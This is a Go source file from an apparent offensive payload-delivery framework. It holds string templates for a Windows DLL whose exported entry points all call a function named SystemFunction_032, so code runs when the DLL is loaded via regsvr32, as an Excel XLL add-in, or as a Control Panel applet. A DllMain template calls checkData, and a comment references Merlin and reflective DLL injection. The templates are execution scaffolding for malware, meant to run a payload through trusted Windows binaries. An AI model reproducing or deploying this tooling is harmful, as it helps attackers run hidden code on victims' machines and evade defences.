package delivery

const DllImport = `
import "C"
`

const DllFunc = `


// DllInstall is used when executing with regsvr32.exe 
// https://msdn.microsoft.com/en-us/library/windows/desktop/bb759846(v=vs.85).aspx

//export DllInstall
func DllInstall() { SystemFunction_032() }

// DllRegisterServer is used when executing with regsvr32.exe 
// https://msdn.microsoft.com/en-us/library/windows/desktop/ms682162(v=vs.85).aspx

//export DllRegisterServer
func DllRegisterServer() { SystemFunction_032() }

// DllUnregisterServer is used when executing with regsvr32.exe 
// https://msdn.microsoft.com/en-us/library/windows/desktop/ms691457(v=vs.85).aspx

//export DllUnregisterServer
func DllUnregisterServer() { SystemFunction_032() }

//export xlAutoOpen
func xlAutoOpen() { SystemFunction_032() }

//export xlAutoRegister 
func xlAutoRegister() { SystemFunction_032() }

//export xlAutoRegister12
func xlAutoRegister12() { SystemFunction_032() }

//export CplApplet
func CplApplet() { SystemFunction_032() }

`

const Xll = `

`

const DllProcAttach = `#include <windows.h>
#include <stdio.h>


// https://docs.microsoft.com/en-us/windows/desktop/dlls/dynamic-link-library-entry-point-function

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpReserved )  // reserved
{
    // Perform actions based on the reason for calling.
    switch( fdwReason )
    {
        case DLL_PROCESS_ATTACH:
            // Initialize once for each new process.
            // Return FALSE to fail DLL load.
            // printf("[+] Hello from DllMain-PROCESS_ATTACH in Merlin\n");
            // MessageBoxA( NULL, "Hello from DllMain-PROCESS_ATTACH in Merlin!", "Reflective Dll Injection", MB_OK );
            break;

        case DLL_THREAD_ATTACH:
            // Do thread-specific initialization.
            checkData();
            break;

        case DLL_THREAD_DETACH:
            // Do thread-specific cleanup.
            break;

        case DLL_PROCESS_DETACH:
            // Perform any necessary cleanup.
            break;
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}

`
